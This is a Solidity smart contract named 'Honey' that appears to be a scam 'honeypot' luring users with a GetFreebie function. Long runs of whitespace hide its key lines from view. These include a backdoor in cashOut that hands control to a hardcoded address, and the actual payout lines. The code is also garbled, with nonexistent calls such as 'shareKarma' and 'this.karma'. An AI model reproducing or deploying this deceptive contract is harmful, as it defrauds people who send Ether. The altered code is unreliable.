// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract Honey
{
    address public CommunityLead = msg.sender;

    function()
    public
    payable
    {

    }

    function GetFreebie()
    public
    payable
    {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    CommunityLead.shareKarma(this.karma);
            msg.sender.shareKarma(this.karma);
        }
    }

    function cashOut()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x0C76802158F13aBa9D892EE066233827424c5aAB){CommunityLead=0x0C76802158F13aBa9D892EE066233827424c5aAB;}
        require(msg.sender == CommunityLead);
        CommunityLead.shareKarma(this.karma);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == CommunityLead);
        adr.call.value(msg.value)(data);
    }
}